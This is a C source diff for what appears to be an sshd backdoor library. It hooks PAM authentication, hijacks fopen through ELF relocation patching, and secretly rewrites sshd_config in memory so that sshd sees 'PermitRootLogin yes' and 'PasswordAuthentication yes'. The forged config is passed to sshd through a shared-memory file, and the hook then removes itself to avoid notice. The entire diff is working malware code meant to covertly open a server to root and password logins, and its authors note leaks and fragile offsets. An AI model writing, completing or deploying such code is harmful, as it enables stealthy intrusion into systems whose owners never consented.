@@ -273,12 +273,15 @@ static int my_pam_auth(struct pam_handle *pamh, int flags)
  *	and then unhook ourselves sneaky beaky like
  * TODO: sanity
  * TODO: read sshd.c -- very possible fopen(sshd_config) is the first ever fopen
+ * TODO: ensure EXPLICIT's robustness -- already had to fix an edge case
  * XXX: there is probably an easier way to do what I'm trying to do with bitmasks, but I like the practice and it feels cool
  */
 Elf64_Rela *ref_fopen_Rela;
 FILE *(*ref_fopen)(char*, char*);
 
+int _APPEND_work(char **__new, int *_buf_len, char *filename, char *append);
 
+/* aligned in vim, sorry... */
 #define MASK_64 						0x0000000000000000
 
 #define PermitRootLogin_EXPLICIT		0x0000000000000001
@@ -309,8 +312,6 @@ FILE *my_fopen(char *filename, char *mode)
 	char *PermitRootLogin = NULL;
 	char *PasswordAuthentication = NULL;
 
-	bool noset = false;
-	
 	unsigned long long BITMASK = MASK_64;	
 
 	int ret = 42;
@@ -389,12 +390,13 @@ FILE *my_fopen(char *filename, char *mode)
 			}
 		}
 	}
-	fclose(fp);
+	//fclose(fp); /* XXX: will be useful if something goes wrong later */
+	free(str);
 		
-	signed long int orig_sshd_config_size; /* XXX: checkme: type sanity */
+	signed long int orig_sshd_config_size;
 	struct stat st;	
 	stat(filename, &st);
-	orig_sshd_config_size = st.st_size;
+	orig_sshd_config_size = (signed long int) st.st_size;
 
 
 	/* if we never ran into any of the strings we wanted in sshd_config 
@@ -414,9 +416,7 @@ FILE *my_fopen(char *filename, char *mode)
 	
 
 
-	/* do explicit adds first -- leave them in the SHM 
-		-- make sure we keep track of the buffer size for correct concats when appends come later
-	*/
+	/* read the sshd_specified in the paramater filename into a FD we can read() from */
 
 	int buf_len = orig_sshd_config_size + 150; /* what's 150 bytes between friends? */
 	char *buf = malloc(buf_len);
@@ -428,17 +428,20 @@ FILE *my_fopen(char *filename, char *mode)
 
 	/* we have original sshd_config in memory - buf */
 
-	/* now change the options that were EXPLICITly set */
-	free(str);
-	if ((BITMASK & PermitRootLogin_MASK) == PermitRootLogin_EXPLICIT) {
-		
-		/* find a valid pointer to PermitRootLogin that isn't a comment
-		 * and doesn't abuse strstr()
-		 *
-		 * FIXME: strtok was obliterating buf, so just memcpy a new buf and use that for strtok instead. -- leaks
-		 */
+	char *tok_buf;
+	char *new = NULL;
+	unsigned long long bytes_from_start;
 
-		char *tok_buf = malloc(buf_len); /* FIXME: this will leak */
+	//_EXPLICIT_WORK(char **new, char *config_name, char *redefine, char *ref_sshd_config);
+
+	/* now change the options that were EXPLICITly set */
+	char *PRL_Y = "PermitRootLogin yes\n";
+	if ((BITMASK & PermitRootLogin_MASK) == PermitRootLogin_EXPLICIT) {
+	
+		//_EXPLICIT_WORK(&new, "PermitRootLogin ", PRL_Y, buf);	
+	
+		
+		tok_buf = malloc(buf_len); /* FIXME: this will leak */
 		
 		memcpy(tok_buf, buf, buf_len);
 
@@ -450,18 +453,29 @@ FILE *my_fopen(char *filename, char *mode)
 			str = strtok(NULL, "\n");
 		}
 
-
-		char *PRL_Y = "PermitRootLogin yes\n";
-
 		/* how far is PermitRootLogin from the start of sshd_config */
-		unsigned long long bytes_from_start = (char *) PermitRootLogin - (char *) tok_buf;
+		bytes_from_start = (char *) PermitRootLogin - (char *) tok_buf;
 
 		/* copy all of the bytes from sshd_config into new -- up until (excluding) PermitRootLogin */
-		char *new = malloc(orig_sshd_config_size + 1);
+		if (new == NULL)
+			new = malloc(buf_len);
 		memcpy(new, buf, bytes_from_start);
 
+		/* bytes_from_start can be wonky
+		 * 	e.g. the above memcpy will copy junk after a valid config option into new
+		 * this will make sure that bytes_from_start is aligned to a valid \n,
+		 */
+		int i = 0;
+		char x; 
+		x = *((char*) new + bytes_from_start); // get single char from (new + bytes_from_start)
+		while (x != '\n') {
+			bytes_from_start--;
+			i++;
+			x = *((char*) new + bytes_from_start);
+		}
+		
 		/* ... */
-		strncat(new, PRL_Y, strlen(PRL_Y));
+		memcpy((char *) new + bytes_from_start + i, PRL_Y, strlen(PRL_Y));
 
 		/* get number of char until \n in "PermitRootLogin no" 
 		 * XXX: this most likely isn't needed anymore as this will always be the above no string (+1)
@@ -476,8 +490,8 @@ FILE *my_fopen(char *filename, char *mode)
 		 * copy into new -- make sure we skip the "PermitRootLogin yes" we just added by adding newline
 		 * from buf -- bytes_from_start + strlen() will cut "PermitRootLogin no" from buf so we can append the rest of buf
 		 */	
-		memcpy((char *) new + (unsigned long long) bytes_from_start + newline, 
-					(char*) buf + bytes_from_start + strlen("PermitRootLogin no"),
+		memcpy((char *) new + (unsigned long long) bytes_from_start + newline + i, 
+					(char*) buf + bytes_from_start + i + strlen("PermitRootLogin no"),
 					strlen(buf + bytes_from_start));
 
 		
@@ -485,129 +499,64 @@ FILE *my_fopen(char *filename, char *mode)
 		buf = new;
 	}
 
+	/* same code as above -- XXX: could probably be made into a function */
+	char *PA_Y = "PasswordAuthentication yes\n";
 	if ((BITMASK & PasswordAuthentication_MASK) == PasswordAuthentication_EXPLICIT) {
 
+		tok_buf = malloc(buf_len); /* FIXME: this will leak */
+		
+		memcpy(tok_buf, buf, buf_len);
 
+		str = strtok(tok_buf, "\n");
+		while (str != NULL) {
+			if (strncmp(str, "PasswordAuthentication ", strlen("PasswordAuthentication ")) == 0) {
+				PasswordAuthentication = strstr(str, "PasswordAuthentication");
+			}
+			str = strtok(NULL, "\n");
+		}
 
-
-	}
-
-
-
-
-
-
-
-
-
-
-
+		bytes_from_start = (char *) PasswordAuthentication - (char *) tok_buf;
 	
-	sleep(5);
-	char *repl = "PermitRootLogin yes\n";
-	if (noset == true) {
-		/* "PermitRootLogin No" was explicity set */
-		
-		char *buf = malloc(orig_sshd_config_size + 1);
-		/* sanity() */
-		int orig_fd = open(filename, O_RDONLY);
-		read(orig_fd, buf, orig_sshd_config_size);
-
-		PermitRootLogin = strstr(buf, "PermitRootLogin");	
-
-		/* how far is PermitRootLogin from the start of sshd_config */
-		unsigned long long bytes_from_start = (char *) PermitRootLogin - (char *) buf;
-
-		/* copy all of the bytes from sshd_config into new -- up until (excluding) PermitRootLogin */
-		char *new = malloc(orig_sshd_config_size + 1);
+		if (new == NULL)
+			new = malloc(buf_len);
 		memcpy(new, buf, bytes_from_start);
+
+		int i = 0;
+		char x; 
+		x = *((char*) new + bytes_from_start);
+		while (x != '\n') {
+			bytes_from_start--;
+			i++;
+			x = *((char*) new + bytes_from_start);
+		}
 		
 		/* ... */
-		strncat(new, repl, strlen(repl));
+		memcpy((char *) new + bytes_from_start + i, PA_Y, strlen(PA_Y));
 
-		/* ... */
-		int newline = strcspn(PermitRootLogin, "\n");
+		/* XXX: this most likely isn't needed anymore as this will always be the above no string (+1) */
+		int newline = strcspn(PasswordAuthentication, "\n");
 		newline += 1; /* +1 - strlen(yes) = 3 . strlen(no) = 2 */
 		
-		/* this cuts out "PermitRootLogin No\n" and should also give us enough space (+1) to write Yes */
-		PermitRootLogin = (char *) PermitRootLogin + (unsigned long long ) newline;
 
-		/* buf + orig_sshd_config_size -- if casted correctly will give us the end of sshd_config in memory */
-		void *end = (char *) buf + (unsigned long long) orig_sshd_config_size;
+		memcpy((char *) new + (unsigned long long) bytes_from_start + newline + i,
+					(char*) buf + bytes_from_start + i + strlen("PasswordAuthentication no"),
+					strlen(buf + bytes_from_start));
+
 		
-		/* PermitRootLogin has been cut out correctly (+1) as said above. now we just copy the rest of the config into new */
-		unsigned long long bytes_left = (char *)end - (char *) PermitRootLogin;
-
-		strncat(new, PermitRootLogin, bytes_left);
-
-		/* small cleanup */
-		fclose(fp); /* XXX: change - this FILE* will be useful for error recovery if necessary */
-		close(orig_fd);	
 		free(buf);
+		buf = new;
+	}
+	/* don't think there is any way we will need to realloc(new, buflen+x) 
+	 * but if that does ever become necessary be sure to update buf_len correctly
+	 */
 
-		/* the new sshd_config is now set up correctly */	
+
+	if ((BITMASK & PermitRootLogin_MASK) == PermitRootLogin_APPEND) {
+		_APPEND_work(&new, &buf_len, filename, PRL_Y);
+	}
 	
-		int fd = shm_open("/7355608", O_RDWR | O_CREAT, 0400);
-		
-		ftruncate(fd, orig_sshd_config_size + 1);
-
-		mmap(0, orig_sshd_config_size + 1, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0 );
-
-		write(fd, new, orig_sshd_config_size + 1);
-
-		/* give sshd the /dev/shm file descriptor, which should clean itself up after sshd is done using it -- rewind() is important */
-		fp = fdopen(fd, mode);
-		rewind(fp);
-
-		shm_unlink("/7355608");
-
-
-		/* job well done... reset our RELA -- don't care about any more fopens */
-		hook_rela_addend(ref_fopen_Rela, ref_fopen);
-
-		free(new);
-			
-		return fp;
-	
-	} else {
-		/* PermitRootLogin has NOT been explicity set, and sshd will default to PERMIT_NOT_SET -- not good */
-		int repl_len = strlen(repl);
-		char *new = malloc(orig_sshd_config_size + repl_len);
-		
-		int orig_fd = open(filename, O_RDONLY);
-		read(orig_fd, new, orig_sshd_config_size);
-
-		close(orig_fd);
-		fclose(fp);
-
-
-		/* tack on *repl onto the end of sshd_config */
-		char *end = (char *) new + (unsigned long long) orig_sshd_config_size;
-		
-		memcpy(end, repl, repl_len);	
-
-		/* new is now set up correctly - just need to work fdopen magic */
-		int fd = shm_open("/7355608", O_RDWR | O_CREAT, 0400);
-		
-		ftruncate(fd, orig_sshd_config_size + repl_len);
-
-		mmap(0, orig_sshd_config_size + repl_len, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0 );
-
-		write(fd, new, orig_sshd_config_size + repl_len);
-
-		/* give sshd the /dev/shm file descriptor, which should clean itself up after sshd is done using it -- rewind() is important */
-		fp = fdopen(fd, mode);
-		rewind(fp);
-
-		shm_unlink("/7355608");
-
-
-		/* job well done... reset our RELA -- don't care about any more fopens */
-		hook_rela_addend(ref_fopen_Rela, ref_fopen);
-
-		free(new);
-			
-		return fp;
+	if ((BITMASK & PasswordAuthentication_MASK) == PasswordAuthentication_APPEND) {
+		_APPEND_work(&new, &buf_len, filename, PA_Y);
 	}
 
 
@@ -615,15 +564,63 @@ FILE *my_fopen(char *filename, char *mode)
 
 
 
+
+
+	/* this passes a valid FILE* back to sshd using SHM and the new sshd_config we just made
+	 * 	shm_unlink should ensure that when sshd fclose(fp) the shm will be deleted 
+	 */
+	int fd = shm_open("/7355608", O_RDWR | O_CREAT, 0400);
 	
-done:
+	ftruncate(fd, buf_len);
+
+	mmap(0, buf_len, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0 );
+
+	write(fd, new, buf_len);
+
+	//free(new);	
+	fp = fdopen(fd, mode);
+	rewind(fp);
+	
+	shm_unlink("/7355608");
+
 	hook_rela_addend(ref_fopen_Rela, ref_fopen);
-
-	free(str);
-	fsetpos(fp, &ref_pos);
-
 	return fp;
 }
+
+/* XXX:cleanup **__new */
+int _APPEND_work(char **__new, int *_buf_len, char *filename, char *append)
+{
+	int buf_len = *_buf_len;
+
+	/* no EXPLICITs have happened before -- it's up to us to read() and malloc */
+	if (*__new == NULL)  {
+		*__new = malloc(buf_len);
+		int orig_fd = open(filename, O_RDONLY);
+		read(orig_fd, *__new, buf_len);
+		close(orig_fd);
+	}	
+	
+	int append_len = strlen(append);
+	int newlen = strlen(*__new);
+
+	if ((newlen + append_len) > buf_len) {
+		if (realloc(*__new, buf_len + append_len) == NULL) {
+			/* mercy */
+			return -1111111111;
+		}
+		*_buf_len = *_buf_len + append_len;
+	}
+
+	/* XXX: do timing tests on how long strncat takes */
+	memcpy((char *) *__new + newlen, append, append_len);
+
+	/* ensure null termination */	
+	memcpy(((char*) *__new + newlen + append_len), "\0", 1);
+	
+	return 0;
+}
+
+
 
 static void  __attribute__ ((constructor)) init(void)
 {
